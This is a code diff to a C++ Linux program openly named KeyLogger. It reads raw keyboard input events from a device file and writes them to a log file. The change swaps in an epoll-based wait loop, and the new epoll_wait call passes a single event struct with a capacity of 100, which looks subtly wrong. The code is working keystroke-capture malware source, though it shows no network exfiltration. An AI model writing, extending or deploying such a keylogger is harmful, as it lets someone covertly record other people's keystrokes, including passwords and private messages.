@@ -4,15 +4,19 @@
 #include <linux/input.h>
 #include <string.h>
 #include <errno.h>
+#include <sys/epoll.h>
+
+#define MAX_EVENTS 100
 
 using namespace std;
 
 class KeyLogger 
 {
 private:
-  int fd;
+  int fd, efd, cfg, ret, n;
   FILE *pFile;
   struct input_event ev;
+  struct epoll_event ee, *events;
 
 public:
   KeyLogger(int argc, char **argv)
@@ -34,12 +38,29 @@ public:
 	cerr <<  "od open: " << strerror(errno) << endl;
 	exit(1);
       }
+
+    if ((efd = epoll_create(sizeof(fd))) < 0)
+      {
+	cerr << "epoll_create: " << strerror(errno) << endl;
+	exit(1);
+      }
+
+    ee.events = EPOLLIN;
+    if ((cfg = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ee)) < 0)
+      {
+	cerr << "epoll_ctl: " << strerror(errno) << endl;
+	exit(1);
+      }
   }
 
   void log()
   {
     while(1)
       {
+	ret = epoll_wait(efd, &ee, MAX_EVENTS, -1);
+	if (ret < 0)
+	  cerr << "epoll_wait: "  << strerror(errno) << endl;
+
 	if (read(fd, &ev, sizeof(ev)) < 0)
 	  {
 	    cerr <<  "read: " << strerror(errno) << endl;
@@ -54,6 +75,7 @@ public:
 	fflush(pFile);
       }
 
+    close(efd);
     close(fd);
     fclose(pFile);
     
